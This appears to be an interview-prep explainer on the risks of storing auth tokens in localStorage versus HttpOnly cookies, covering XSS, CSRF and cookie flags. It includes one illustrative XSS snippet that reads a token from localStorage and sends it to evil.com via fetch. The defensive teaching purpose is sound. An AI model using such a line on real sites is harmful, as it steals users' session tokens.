447. What are the security risks of storing auth tokens in localStorage vs cookies?

One-Line Answer

Storing tokens in localStorage is risky because XSS JavaScript running inside your domain can read it. Storing tokens in HttpOnly cookies is safer against token theft because JavaScript cannot read them, but cookies need CSRF protection.

First Understand: What Is Auth Token?

After login, backend gives a token or session id.

Example Token
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...

Frontend needs to store this token so future API requests can prove that the user is logged in.

Option 1 - Store Token In localStorage

React / JavaScript Example
localStorage.setItem('token', token);

const token = localStorage.getItem('token');
localStorage is easy to use and token remains after page refresh.

Important: localStorage Is Domain Scoped

Yes, localStorage is stored against a domain / origin.

Website Can Read localStorage Of
https://myapp.com https://myapp.com
https://evil.com https://evil.com only
evil.com cannot directly read myapp.com's localStorage because browser Same-Origin Policy blocks it.

Then How Can localStorage Token Be Stolen?

The problem starts when malicious JavaScript runs inside your own website because of XSS.

Without XSS, evil.com cannot read your localStorage.

evil.com
↓
Tries To Read myapp.com localStorage
↓
Browser Blocks It
↓
Safe

But with XSS, attacker code runs inside your domain.

User Opens myapp.com
↓
XSS Script Executes
↓
Script Runs As myapp.com
↓
Reads myapp.com localStorage
↓
Sends Token To evil.com

XSS Token Theft Example

Malicious Script Running Inside myapp.com
const token = localStorage.getItem('token');

fetch('https://evil.com/steal?token=' + token);
localStorage itself is domain protected, but XSS script runs inside the same domain, so it gets the same permission as your React app.

↓
Domain Protected
↓

localStorage + XSS
↓

↓

↓
Dangerous

Option 2 - Store Token In Cookie

A cookie can be set by the backend.

Server Cookie Example
Set-Cookie: token=abc123; HttpOnly; Secure; SameSite=Lax

What Is HttpOnly?

HttpOnly means JavaScript cannot read the cookie.
JavaScript Try
console.log(document.cookie);

If the auth cookie is HttpOnly, it will not be visible here.

Even if XSS happens, attacker JavaScript cannot directly read an HttpOnly cookie.

Cookie Risk: CSRF

Cookies are automatically sent by browser with matching requests.

User Logged In
↓
Cookie Exists
↓
User Opens Evil Website
↓
Evil Website Sends Request To myapp.com
↓
Browser May Send Cookie Automatically
↓
CSRF Risk
Cookies protect better against token stealing, but they can create CSRF risk if SameSite and CSRF tokens are not used.

localStorage vs Cookies

Point localStorage HttpOnly Cookie
Can JavaScript read it? Yes No, if HttpOnly
Directly readable by evil.com? No, domain protected No
Readable if XSS runs inside your site? Yes No, if HttpOnly
Automatically sent with requests? No Yes
Main risk XSS token theft CSRF
Common protection Prevent XSS SameSite + CSRF token

Best Practice

Use HttpOnly Cookie
↓
Add Secure Flag
↓
Add SameSite=Lax or Strict
↓
Use CSRF Token For Sensitive Requests
↓
Prevent XSS Also

Example Safer Cookie Setup

Backend Response Header
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Lax; Path=/

Meaning:

  • HttpOnly: JavaScript cannot read it.
  • Secure: cookie sent only over HTTPS.
  • SameSite=Lax: reduces CSRF risk.
  • Path=/: cookie available for whole website.

Very Important Point

HttpOnly cookies reduce token theft from XSS, but they do not make XSS harmless. XSS can still click buttons, call APIs, change UI, or perform actions as the user while the page is open.

Interview Answer

localStorage is scoped to the website's domain, so another domain like evil.com cannot directly read it. But if an XSS vulnerability allows attacker JavaScript to run inside your own domain, that script can read localStorage and steal the auth token. HttpOnly cookies are safer against token theft because JavaScript cannot read them, even during XSS. However, cookies are automatically sent with requests, so they need SameSite settings and CSRF protection.

One-Line Interview Answer

localStorage is vulnerable to token theft during XSS, while HttpOnly cookies protect the token from JavaScript but require CSRF protection.
